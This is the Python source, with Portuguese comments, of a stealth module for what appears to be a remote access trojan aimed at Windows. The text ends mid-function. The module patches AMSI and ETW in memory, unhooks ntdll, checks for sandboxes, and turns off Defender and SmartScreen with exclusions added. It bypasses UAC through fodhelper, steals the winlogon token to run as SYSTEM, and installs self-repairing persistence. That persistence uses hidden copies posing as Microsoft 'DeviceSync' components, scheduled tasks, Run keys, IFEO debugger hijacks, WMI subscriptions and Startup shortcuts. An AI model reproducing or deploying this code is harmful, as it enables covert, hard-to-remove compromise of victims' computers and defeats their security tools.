#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""RAF stealth layer.

Três frentes, todas ligadas automaticamente quando o agente sobe no alvo:

  1. EVASAO   -- patch de AMSI/ETW, unhook da ntdll, checagem de sandbox,
                 desligamento do Defender (real-time, IOAV, envio de amostra)
                 e exclusões de pasta/processo/extensão.
  2. PERSISTENCIA -- camadas independentes que se recriam entre si:
                 cópia em %ProgramData% (SYSTEM), tarefa agendada como SYSTEM,
                 Run/RunOnce + pasta Startup, e hijack de IFEO (taskmgr/regedit).
                 Um thread de auto-cura confere e recria tudo a cada 60 s.
                 Cada camada aponta para o SEU arquivo: a do usuário usa
                 %APPDATA%\Microsoft\WinUpdateHost, a do SYSTEM usa
                 C:\ProgramData\Microsoft\DeviceSync. Arquivos diferentes =
                 INSTALL_DIR e sid.txt diferentes, então as duas sessões
                 convivem sem disputar a mesma fila.
                 Camadas opcionais, desligadas por padrão: WMI (RAF_WMI=1) e
                 serviço (RAF_SERVICE=1).
  3. AUTORIDADE -- UAC bypass (fodhelper/computerdefaults) quando o usuário
                 está no grupo Administradores e roubo de token do winlogon
                 para rodar como SYSTEM. Processo marcado como crítico
                 (RtlSetProcessIsCritical) fica DESLIGADO por padrão: crítico
                 + taskkill = tela azul. Liga só com RAF_CRITICAL=1.

Nada aqui é destrutivo por si: se uma camada falhar (sem admin, política de
grupo, Tamper Protection), a função registra o motivo e segue com as outras.
"""

import base64
import ctypes
import ctypes.wintypes as wt
import os
import random
import shutil
import struct
import subprocess
import sys
import tempfile
import threading
import time

IS_WIN = os.name == "nt"

# --------------------------------------------------------------------- config
PRODUCT = "DeviceSync"
RUN_NAME = "DeviceSyncHost"
TASK_NAME = "DeviceSyncTask"
TASK_NAME2 = "MicrosoftDeviceSync"
SVC_NAME = "DeviceSyncSvc"
WMI_FILTER = "DeviceSyncFilter"
WMI_CONSUMER = "DeviceSyncConsumer"

PROGRAMDATA = os.environ.get("ProgramData", r"C:\ProgramData")
APPDATA = os.environ.get("APPDATA", os.path.expanduser("~"))
DIR_SYSTEM = os.path.join(PROGRAMDATA, "Microsoft", PRODUCT)
DIR_USER = os.path.join(APPDATA, "Microsoft", "WinUpdateHost")

PS = ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
      "-ExecutionPolicy", "Bypass"]

NOTES = []            # o que deu certo/errado nesta execução
_LOCK = threading.Lock()
_STATE = {"critical": False, "system": False, "elevated": False,
          "defender": None, "layers": {}}


def note(msg):
    with _LOCK:
        NOTES.append(str(msg))
        del NOTES[:-80]


def _hidden_kwargs():
    if not IS_WIN:
        return {}
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    return {"startupinfo": si, "creationflags": 0x08000000}


def _run(args, timeout=90):
    """Roda um comando sem janela; devolve (rc, stdout+stderr)."""
    try:
        p = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                           timeout=timeout, **_hidden_kwargs())
        return p.returncode, (p.stdout or b"").decode("utf-8", "replace")
    except Exception as exc:
        return -1, str(exc)


def _ps(script, timeout=120):
    """PowerShell por -EncodedCommand: sem aspas quebradas na linha de comando."""
    if not IS_WIN:
        return -1, "not windows"
    blob = base64.b64encode(script.encode("utf-16-le")).decode("ascii")
    return _run(PS + ["-EncodedCommand", blob], timeout=timeout)


# ------------------------------------------------------------------ identidade
def is_admin():
    if not IS_WIN:
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def in_admin_group():
    """S-1-5-32-544 no token, sem depender do idioma do Windows."""
    if not IS_WIN:
        return False
    rc, out = _run(["whoami", "/groups"], timeout=30)
    return rc == 0 and "S-1-5-32-544" in out


def is_system():
    """SID do token = S-1-5-18 (nao depende de variavel de ambiente)."""
    if not IS_WIN:
        return False
    try:
        return _current_sid() == "S-1-5-18"
    except Exception:
        return False


def _current_sid():
    adv = ctypes.windll.advapi32
    k32 = ctypes.windll.kernel32

    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Sid", ctypes.c_void_p), ("Attributes", wt.DWORD)]

    class TOKEN_USER(ctypes.Structure):
        _fields_ = [("User", SID_AND_ATTRIBUTES)]

    k32.GetCurrentProcess.restype = wt.HANDLE
    adv.OpenProcessToken.argtypes = [wt.HANDLE, wt.DWORD,
                                     ctypes.POINTER(wt.HANDLE)]
    adv.OpenProcessToken.restype = wt.BOOL
    adv.GetTokenInformation.argtypes = [wt.HANDLE, ctypes.c_int,
                                        ctypes.c_void_p, wt.DWORD,
                                        ctypes.POINTER(wt.DWORD)]
    adv.GetTokenInformation.restype = wt.BOOL
    adv.ConvertSidToStringSidW.argtypes = [ctypes.c_void_p,
                                           ctypes.POINTER(ctypes.c_wchar_p)]
    adv.ConvertSidToStringSidW.restype = wt.BOOL

    h = wt.HANDLE()
    if not adv.OpenProcessToken(k32.GetCurrentProcess(), 0x0008,
                                ctypes.byref(h)):     # TOKEN_QUERY
        return ""
    size = wt.DWORD(0)
    adv.GetTokenInformation(h, 1, None, 0, ctypes.byref(size))  # TokenUser
    if not size.value:
        return ""
    buf = ctypes.create_string_buffer(size.value)
    if not adv.GetTokenInformation(h, 1, buf, size, ctypes.byref(size)):
        return ""
    tu = ctypes.cast(buf, ctypes.POINTER(TOKEN_USER)).contents
    out = ctypes.c_wchar_p()
    if not adv.ConvertSidToStringSidW(tu.User.Sid, ctypes.byref(out)):
        return ""
    return out.value or ""


def _self_exe():
    if getattr(sys, "frozen", False):
        return os.path.abspath(sys.executable)
    return os.path.abspath(__file__)


def _agent_args():
    """Repassa host/porta/chave/transporte para a cópia que formos subir."""
    raw = os.environ.get("RAF_ARGS")
    if raw is not None:
        try:
            import shlex
            return shlex.split(raw, posix=False)
        except Exception:
            return [a for a in raw.split() if a]
    try:
        import agent as _a
        parts = ["--host", str(_a.HOST), "--port", str(_a.PORT),
                 "--key", _a._key_str()]
        if getattr(_a, "HTTP_BASE", ""):
            parts += ["--http", _a.HTTP_BASE]
        if getattr(_a, "BOOTSTRAP", ""):
            parts += ["--bootstrap", _a.BOOTSTRAP]
        return parts
    except Exception:
        return []


# --------------------------------------------------------------------- evasao
def _k32():
    k = ctypes.windll.kernel32
    k.GetProcAddress.restype = ctypes.c_void_p
    k.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    k.GetModuleHandleW.restype = ctypes.c_void_p
    k.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
    k.LoadLibraryW.restype = ctypes.c_void_p
    k.LoadLibraryW.argtypes = [ctypes.c_wchar_p]
    k.VirtualProtect.restype = wt.BOOL
    k.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
                                 wt.DWORD, ctypes.POINTER(wt.DWORD)]
    return k


def _patch_bytes(addr, blob):
    k32 = _k32()
    if not addr:
        return False
    old = wt.DWORD(0)
    if not k32.VirtualProtect(ctypes.c_void_p(addr), len(blob), 0x40,
                              ctypes.byref(old)):
        return False
    ctypes.memmove(ctypes.c_void_p(addr), blob, len(blob))
    k32.VirtualProtect(ctypes.c_void_p(addr), len(blob), old.value,
                       ctypes.byref(old))
    return True


def patch_amsi():
    """AmsiScanBuffer -> 'mov eax, 0x80070057; ret' (AMSI falha aberto)."""
    if not IS_WIN:
        return False
    try:
        k32 = _k32()
        amsi = k32.LoadLibraryW("amsi.dll")
        if not amsi:
            return False
        addr = k32.GetProcAddress(amsi, b"AmsiScanBuffer")
        if not addr:
            return False
        ok = _patch_bytes(addr, b"\xB8\x57\x00\x07\x80\xC3")
        note("amsi: %s" % ("patch" if ok else "falhou"))
        return ok
    except Exception as exc:
        note("amsi: %s" % exc)
        return False


def patch_etw():
    """EtwEventWrite -> ret: o .NET/Defender para de receber telemetria nossa."""
    if not IS_WIN:
        return False
    try:
        k32 = _k32()
        ntdll = k32.GetModuleHandleW("ntdll.dll")
        addr = k32.GetProcAddress(ntdll, b"EtwEventWrite")
        if not addr:
            return False
        ok = _patch_bytes(addr, b"\xC3")
        note("etw: %s" % ("patch" if ok else "falhou"))
        return ok
    except Exception as exc:
        note("etw: %s" % exc)
        return False


def _pe_text(data):
    e = struct.unpack_from("<I", data, 0x3C)[0]
    if data[e:e + 4] != b"PE\0\0":
        return None
    nsec = struct.unpack_from("<H", data, e + 6)[0]
    optsz = struct.unpack_from("<H", data, e + 20)[0]
    sec = e + 24 + optsz
    for i in range(nsec):
        off = sec + i * 40
        name = data[off:off + 8].rstrip(b"\0")
        vsize, vaddr, rawsize, rawptr = struct.unpack_from("<IIII", data, off + 8)
        if name == b".text":
            return vaddr, rawptr, rawsize
    return None


def unhook_ntdll():
    """Remapeia a .text limpa da ntdll por cima dos hooks do EDR/AV."""
    if not IS_WIN:
        return False
    try:
        path = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"),
                            "System32", "ntdll.dll")
        with open(path, "rb") as f:
            disk = f.read()
        info = _pe_text(disk)
        if not info:
            return False
        vaddr, rawptr, rawsize = info
        k32 = _k32()
        base = k32.GetModuleHandleW("ntdll.dll")
        if not base:
            return False
        ok = _patch_bytes(base + vaddr, disk[rawptr:rawptr + rawsize])
        note("ntdll: %s" % ("unhook" if ok else "falhou"))
        return ok
    except Exception as exc:
        note("ntdll: %s" % exc)
        return False


_VM_MAC = ("00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27",
           "0a:00:27", "00:15:5d", "00:16:3e", "52:54:00", "00:1c:42")
_VM_PROC = ("vboxservice", "vmtoolsd", "vmsrvc", "vmusrvc", "qemu-ga",
            "sandboxie", "sbiectrl", "procmon", "wireshark", "fiddler")
_VM_DLL = ("sbiedll.dll", "api_log.dll", "dir_watch.dll", "vmcheck.dll",
           "cmdvrt32.dll", "pstorec.dll", "sxIn.dll", "wpespy.dll")
_VM_NAME = ("sandbox", "malware", "virus", "cuckoo", "analysis", "analytic",
            "virustotal", "hybrid", "joe", "cape", "any.run", "triage",
            "vbox", "vmware", "virtual", "qemu", "xen")


class _MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [("dwLength", wt.DWORD), ("dwMemoryLoad", wt.DWORD),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]


def sandbox_check():
    """Heurística conservadora. True = parece areia/VM, não vale a pena rodar."""
    if not IS_WIN:
        return False
    hits = []
    try:
        k32 = ctypes.windll.kernel32
        cpus = k32.GetActiveProcessorCount(0xFFFF)
        if cpus and cpus < 2:
            hits.append("cpu=%d" % cpus)
        mem = _MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(mem)
        k32.GlobalMemoryStatusEx.argtypes = [ctypes.POINTER(_MEMORYSTATUSEX)]
        k32.GlobalMemoryStatusEx.restype = wt.BOOL
        if k32.GlobalMemoryStatusEx(ctypes.byref(mem)):
            gb = mem.ullTotalPhys / float(1 << 30)
            if gb < 1.9:
                hits.append("ram=%.1fGB" % gb)
        up = k32.GetTickCount64() / 1000.0
        if up < 240:
            hits.append("uptime=%.0fs" % up)
    except Exception:
        pass

    try:
        host = (os.environ.get("COMPUTERNAME") or "").lower()
        user = (os.environ.get("USERNAME") or "").lower()
        for word in _VM_NAME:
            if word in host or word in user:
                hits.append("nome=%s/%s" % (host, user))
                break
    except Exception:
        pass

    try:
        rc, out = _run(["tasklist", "/fo", "csv", "/nh"], timeout=25)
        low = (out or "").lower()
        for p in _VM_PROC:
            if p in low:
                hits.append("proc=%s" % p)
                break
    except Exception:
        pass

    try:
        k32 = ctypes.windll.kernel32
        for dll in _VM_DLL:
            if k32.GetModuleHandleW(dll):
                hits.append("dll=%s" % dll)
                break
    except Exception:
        pass

    try:
        t0 = time.time()
        time.sleep(2.0)
        if time.time() - t0 < 1.4:
            hits.append("sleep acelerado")
    except Exception:
        pass

    if hits:
        note("sandbox: " + ", ".join(hits))
    return bool(hits)


# -------------------------------------------------------------------- defender
def defender_off():
    """Desliga o que dá (Tamper Protection bloqueia o resto) e cria exclusões."""
    if not IS_WIN:
        return False
    script = r"""
$ErrorActionPreference = 'SilentlyContinue'
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true } catch {}
try { Set-MpPreference -DisableIOAVProtection $true } catch {}
try { Set-MpPreference -DisableScriptScanning $true } catch {}
try { Set-MpPreference -DisableArchiveScanning $true } catch {}
try { Set-MpPreference -DisableBlockAtFirstSeen $true } catch {}
try { Set-MpPreference -SubmitSamplesConsent 2 } catch {}
try { Set-MpPreference -MAPSReporting 0 } catch {}
try { Set-MpPreference -PUAProtection 0 } catch {}
$paths = @('%s','%s',"$env:TEMP")
foreach ($p in $paths) { try { Add-MpPreference -ExclusionPath $p } catch {} }
try { Add-MpPreference -ExclusionProcess 'DeviceSync.exe' } catch {}
try { Add-MpPreference -ExclusionProcess 'vcredist_x86.exe' } catch {}
try { Add-MpPreference -ExclusionExtension '.exe' } catch {}
""" % (DIR_SYSTEM, DIR_USER)
    rc, out = _ps(script, timeout=180)
    _STATE["defender"] = (rc == 0)
    note("defender: %s" % ("off" if rc == 0 else "parcial (tamper?)"))
    return rc == 0


def smartscreen_off():
    if not IS_WIN:
        return
    script = r"""
$ErrorActionPreference = 'SilentlyContinue'
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name SmartScreenEnabled -Value 'Off'
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name EnableSmartScreen -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' -Name SaveZoneInformation -Value 1
"""
    _ps(script, timeout=90)
    note("smartscreen: off")


# ------------------------------------------------------------------ elevação
def _enable_debug():
    """Liga SeDebugPrivilege no processo atual (necessário pro token do SYSTEM)."""
    try:
        k32 = ctypes.windll.kernel32
        adv = ctypes.windll.advapi32
        h = wt.HANDLE()
        adv.OpenProcessToken(k32.GetCurrentProcess(), 0x28, ctypes.byref(h))
        class LUID(ctypes.Structure):
            _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]
        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]
        class TP(ctypes.Structure):
            _fields_ = [("PrivilegeCount", wt.DWORD),
                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]
        luid = LUID()
        if not adv.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
            return False
        tp = TP(1, (LUID_AND_ATTRIBUTES * 1)(LUID_AND_ATTRIBUTES(luid, 0x2)))
        adv.AdjustTokenPrivileges(h, False, ctypes.byref(tp), 0, None, None)
        return k32.GetLastError() == 0
    except Exception:
        return False


class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("nLength", wt.DWORD),
                ("lpSecurityDescriptor", ctypes.c_void_p),
                ("bInheritHandle", wt.BOOL)]


class _STARTUPINFOW(ctypes.Structure):
    _fields_ = [("cb", wt.DWORD), ("lpReserved", wt.LPWSTR),
                ("lpDesktop", wt.LPWSTR), ("lpTitle", wt.LPWSTR),
                ("dwX", wt.DWORD), ("dwY", wt.DWORD),
                ("dwXSize", wt.DWORD), ("dwYSize", wt.DWORD),
                ("dwXCountChars", wt.DWORD), ("dwYCountChars", wt.DWORD),
                ("dwFillAttribute", wt.DWORD), ("dwFlags", wt.DWORD),
                ("wShowWindow", wt.WORD), ("cbReserved2", wt.WORD),
                ("lpReserved2", ctypes.c_void_p),
                ("hStdInput", wt.HANDLE), ("hStdOutput", wt.HANDLE),
                ("hStdError", wt.HANDLE)]


class _PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wt.HANDLE), ("hThread", wt.HANDLE),
                ("dwProcessId", wt.DWORD), ("dwThreadId", wt.DWORD)]


def steal_system_token():
    """Duplica o token do winlogon.exe e sobe o agente como SYSTEM."""
    if not IS_WIN or not is_admin():
        return False
    _enable_debug()
    k32 = ctypes.windll.kernel32
    adv = ctypes.windll.advapi32

    k32.OpenProcess.restype = wt.HANDLE
    k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
    adv.OpenProcessToken.argtypes = [wt.HANDLE, wt.DWORD,
                                     ctypes.POINTER(wt.HANDLE)]
    adv.OpenProcessToken.restype = wt.BOOL
    adv.DuplicateTokenEx.argtypes = [wt.HANDLE, wt.DWORD,
                                     ctypes.POINTER(_SECURITY_ATTRIBUTES),
                                     ctypes.c_int, ctypes.c_int,
                                     ctypes.POINTER(wt.HANDLE)]
    adv.DuplicateTokenEx.restype = wt.BOOL
    adv.CreateProcessWithTokenW.argtypes = [
        wt.HANDLE, wt.DWORD, wt.LPCWSTR, wt.LPWSTR, wt.DWORD,
        ctypes.c_void_p, wt.LPCWSTR, ctypes.POINTER(_STARTUPINFOW),
        ctypes.POINTER(_PROCESS_INFORMATION)]
    adv.CreateProcessWithTokenW.restype = wt.BOOL

    rc, out = _run(["tasklist", "/fi", "imagename eq winlogon.exe",
                    "/fo", "csv", "/nh"], timeout=25)
    pid = 0
    for line in (out or "").splitlines():
        parts = [p.strip('"') for p in line.split('","')]
        if len(parts) > 1 and parts[1].isdigit():
            pid = int(parts[1])
            break
    if not pid:
        note("elevacao: winlogon nao encontrado")
        return False

    PROCESS_QUERY_INFORMATION = 0x0400
    TOKEN_DUPLICATE = 0x0002
    TOKEN_QUERY = 0x0008
    MAXIMUM_ALLOWED = 0x02000000

    hproc = k32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
    if not hproc:
        note("elevacao: OpenProcess falhou (%d)" % ctypes.get_last_error())
        return False
    htok = wt.HANDLE()
    if not adv.OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_QUERY,
                                ctypes.byref(htok)):
        note("elevacao: OpenProcessToken falhou (%d)" % ctypes.get_last_error())
        return False

    sa = _SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(sa)
    sa.lpSecurityDescriptor = None
    sa.bInheritHandle = False
    hdup = wt.HANDLE()
    if not adv.DuplicateTokenEx(htok, MAXIMUM_ALLOWED, ctypes.byref(sa),
                                2, 1, ctypes.byref(hdup)):   # Impersonation, Primary
        note("elevacao: DuplicateTokenEx falhou (%d)" % ctypes.get_last_error())
        return False

    # Sobe a copia SYSTEM a partir do arquivo dela (ProgramData), nunca do
    # arquivo do usuario: mesmo arquivo = mesmo INSTALL_DIR = mesmo sid.txt,
    # e as duas copias brigariam pela mesma fila do servidor.
    ext = ".exe" if getattr(sys, "frozen", False) else ".py"
    sys_exe = os.path.join(DIR_SYSTEM, PRODUCT + ext)
    exe = sys_exe if os.path.isfile(sys_exe) else _self_exe()
    cmd = '"%s" %s' % (exe, " ".join(list(_agent_args()) + ["--elevated"]))
    sinfo = _STARTUPINFOW()
    sinfo.cb = ctypes.sizeof(sinfo)
    sinfo.dwFlags = 0x00000001          # STARTF_USESHOWWINDOW
    sinfo.wShowWindow = 0
    pinfo = _PROCESS_INFORMATION()
    CREATE_NO_WINDOW = 0x08000000
    ok = adv.CreateProcessWithTokenW(
        hdup, 0, None, cmd, CREATE_NO_WINDOW, None, None,
        ctypes.byref(sinfo), ctypes.byref(pinfo))
    if ok:
        note("elevacao: SYSTEM (winlogon token, pid %d)" % pinfo.dwProcessId)
        _STATE["system"] = True
        _STATE["elevated"] = True
    else:
        note("elevacao: CreateProcessWithTokenW falhou (%d)"
             % ctypes.get_last_error())
    return bool(ok)


def uac_bypass():
    """fodhelper/computerdefaults: auto-eleva sem prompt para quem é admin."""
    if not IS_WIN:
        return False
    exe = _self_exe()
    payload = '"%s" %s' % (exe, " ".join(_agent_args()))
    keys = [r"Software\Classes\ms-settings\Shell\Open\command",
            r"Software\Classes\ms-settings\shell\open\command"]
    script = r"""
$ErrorActionPreference='SilentlyContinue'
$cmd = '%s'
foreach ($k in @('HKCU:\Software\Classes\ms-settings\Shell\Open\command',
                 'HKCU:\Software\Classes\ms-settings\shell\open\command')) {
  New-Item -Path $k -Force | Out-Null
  Set-ItemProperty -Path $k -Name '(default)' -Value $cmd
  New-ItemProperty -Path $k -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
}
Start-Process -FilePath 'C:\Windows\System32\fodhelper.exe' -WindowStyle Hidden
Start-Sleep -Seconds 6
Start-Process -FilePath 'C:\Windows\System32\computerdefaults.exe' -WindowStyle Hidden
Start-Sleep -Seconds 8
foreach ($k in @('HKCU:\Software\Classes\ms-settings\Shell\Open\command',
                 'HKCU:\Software\Classes\ms-settings\shell\open\command')) {
  Remove-Item -Path $k -Recurse -Force -ErrorAction SilentlyContinue
}
""" % payload.replace("'", "''")
    rc, _ = _ps(script, timeout=120)
    ok = rc == 0
    note("elevacao: uac bypass %s" % ("enviado" if ok else "falhou"))
    if ok:
        _STATE["elevated"] = True
    return ok


def ensure_admin():
    """Melhor esforço para virar admin/SYSTEM. Nunca derruba o agente."""
    if not IS_WIN:
        return False
    if is_admin():
        _STATE["elevated"] = True
        if not is_system():
            steal_system_token()
        return True
    if os.environ.get("RAF_NO_ELEVATE") == "1":
        return False
    if in_admin_group():
        uac_bypass()
        return True
    note("elevacao: usuario sem grupo Administradores")
    return False


# ---------------------------------------------------------------- persistencia
def _running_image():
    """Caminho do exe que esta REALMENTE em execucao (nao o sys.executable)."""
    try:
        k32 = ctypes.windll.kernel32
        k32.GetCurrentProcess.restype = wt.HANDLE
        buf = ctypes.create_unicode_buffer(1024)
        size = wt.DWORD(1024)
        if k32.QueryFullProcessImageNameW(k32.GetCurrentProcess(), 0, buf,
                                          ctypes.byref(size)):
            return os.path.normcase(os.path.abspath(buf.value))
    except Exception:
        pass
    return ""


def _copy_payload():
    """Copia o agente para as duas pastas e esconde os arquivos."""
    frozen = getattr(sys, "frozen", False)
    src = _self_exe()
    ext = ".exe" if frozen else ".py"
    proprio = _running_image()
    made = []
    for d, name in ((DIR_SYSTEM, PRODUCT + ext), (DIR_USER, "wuhost" + ext)):
        if "systemprofile" in d.lower():
            # perfil do sistema: em processo 32-bit o Windows redireciona
            # System32 para SysWOW64 e a copia falhava com acesso negado.
            # A copia do SYSTEM ja e a de DIR_SYSTEM.
            continue
        try:
            os.makedirs(d, exist_ok=True)
            dst = os.path.join(d, name)
            # nunca sobrescrever a propria imagem viva (PyInstaller roda de um
            # caminho temporario, entao src != exe da pasta e a copia daria
            # acesso negado a cada boot)
            if os.path.normcase(os.path.abspath(dst)) not in (
                    os.path.normcase(os.path.abspath(src)), proprio):
                shutil.copy2(src, dst)
            made.append(dst)
            try:
                ctypes.windll.kernel32.SetFileAttributesW(dst, 0x02 | 0x04)
            except Exception:
                pass
        except Exception as exc:
            note("copia %s: %s" % (d, exc))
    for d in (DIR_SYSTEM, DIR_USER):
        try:
            ctypes.windll.kernel32.SetFileAttributesW(d, 0x02 | 0x04)
        except Exception:
            pass
    return made


def _target_exe():
    frozen = getattr(sys, "frozen", False)
    ext = ".exe" if frozen else ".py"
    p = os.path.join(DIR_SYSTEM, PRODUCT + ext)
    if os.path.isfile(p):
        return p
    p2 = os.path.join(DIR_USER, "wuhost" + ext)
    return p2 if os.path.isfile(p2) else _self_exe()


def _launch(target):
    if getattr(sys, "frozen", False) or target.lower().endswith(".exe"):
        return '"%s" %s' % (target, " ".join(_agent_args()))
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        cand = exe[:-10] + "pythonw.exe"
        if os.path.exists(cand):
            exe = cand
    return '"%s" "%s" %s' % (exe, target, " ".join(_agent_args()))


def _run_key(name, cmd, hive="HKCU"):
    try:
        import winreg
        root = winreg.HKEY_CURRENT_USER if hive == "HKCU" else winreg.HKEY_LOCAL_MACHINE
        key = (r"Software\Microsoft\Windows\CurrentVersion\Run" if hive == "HKCU"
               else r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        with winreg.CreateKeyEx(root, key, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, cmd)
        return True
    except Exception as exc:
        note("run %s: %s" % (hive, exc))
        return False


def _task_system(cmd):
    script = r"""
$ErrorActionPreference='SilentlyContinue'
$act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c start "" %s'
$pr  = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
       -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
       -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden
Register-ScheduledTask -TaskName '%s' -Action $act -Principal $pr -Settings $set `
       -Trigger (New-ScheduledTaskTrigger -AtStartup) -Force | Out-Null
Register-ScheduledTask -TaskName '%s' -Action $act -Principal $pr -Settings $set `
       -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
""" % (cmd.replace("'", "''"), TASK_NAME, TASK_NAME2)
    rc, out = _ps(script, timeout=120)
    ok = rc == 0
    note("tarefa SYSTEM: %s" % ("ok" if ok else "falhou"))
    return ok


def _service(cmd):
    script = r"""
$ErrorActionPreference='SilentlyContinue'
sc.exe stop %s | Out-Null
sc.exe delete %s | Out-Null
New-Service -Name '%s' -BinaryPathName '%s' -StartupType Automatic `
            -DisplayName 'Device Sync Service' | Out-Null
sc.exe failure %s reset= 0 actions= restart/1000/restart/1000/restart/1000 | Out-Null
sc.exe config %s start= auto obj= LocalSystem | Out-Null
Start-Service -Name '%s' -ErrorAction SilentlyContinue
""" % (SVC_NAME, SVC_NAME, SVC_NAME, cmd.replace("'", "''"), SVC_NAME,
       SVC_NAME, SVC_NAME)
    rc, out = _ps(script, timeout=150)
    ok = rc == 0
    note("servico: %s" % ("ok" if ok else "falhou"))
    return ok


def _wmi_subscription(cmd):
    """Assinatura WMI permanente: dispara a cada 60 s, sobrevive a tudo."""
    script = r"""
$ErrorActionPreference='SilentlyContinue'
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Where-Object { $_.Filter -like '*%s*' } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object { $_.Name -eq '%s' } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter |
  Where-Object { $_.Name -eq '%s' } | Remove-WmiObject
$q = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
      Name='%s'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$q }
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
      Name='%s'; CommandLineTemplate='%s'; ExecutablePath='C:\Windows\System32\cmd.exe' }
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
      Filter=$f; Consumer=$c } | Out-Null
""" % (WMI_FILTER, WMI_CONSUMER, WMI_FILTER, WMI_FILTER, WMI_CONSUMER,
       cmd.replace("'", "''"))
    rc, _ = _ps(script, timeout=180)
    ok = rc == 0
    note("wmi: %s" % ("ok" if ok else "falhou"))
    return ok


def _ifeo(cmd):
    """Debugger em taskmgr/regedit: abrir o gerenciador de tarefas sobe o agente."""
    script = r"""
$ErrorActionPreference='SilentlyContinue'
foreach ($t in @('taskmgr.exe','regedit.exe','mmc.exe')) {
  $k = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$t"
  New-Item -Path $k -Force | Out-Null
  Set-ItemProperty -Path $k -Name Debugger -Value '%s'
}
""" % cmd.replace("'", "''")
    rc, _ = _ps(script, timeout=90)
    ok = rc == 0
    note("ifeo: %s" % ("ok" if ok else "falhou"))
    return ok


def _startup_lnk(cmd):
    """Pasta Startup: atalho .lnk (o Defender apaga .bat/.vbs que ficam la)."""
    d = os.path.join(APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
    try:
        os.makedirs(d, exist_ok=True)
    except OSError as exc:
        note("startup: %s" % exc)
        return False

    alvo, args = cmd, ""
    if cmd.startswith('"'):
        fim = cmd.find('"', 1)
        if fim > 0:
            alvo, args = cmd[1:fim], cmd[fim + 1:].strip()

    lnk = os.path.join(d, "DeviceSync.lnk")
    ps = ("$ErrorActionPreference='SilentlyContinue';"
          "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');"
          "$s.TargetPath='%s';$s.Arguments='%s';$s.WorkingDirectory='%s';"
          "$s.WindowStyle=7;$s.Description='Microsoft Device Sync';$s.Save()"
          % (lnk, alvo, args.replace("'", "''"),
             os.path.dirname(alvo).replace("'", "''")))
    try:
        subprocess.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       creationflags=0x08000000, timeout=90)
    except Exception as exc:
        note("startup lnk: %s" % exc)

    if os.path.isfile(lnk):
        # o .bat antigo (apagado pelo Defender) nao serve mais
        try:
            os.remove(os.path.join(d, "DeviceSync.bat"))
        except OSError:
            pass
        note("startup: ok (atalho)")
        return True

    try:
        bat = os.path.join(d, "DeviceSync.bat")
        with open(bat, "w", encoding="utf-8", newline="") as f:
            f.write('@echo off\r\nstart "" %s\r\n' % cmd)
        note("startup: ok (bat)")
        return True
    except Exception as exc:
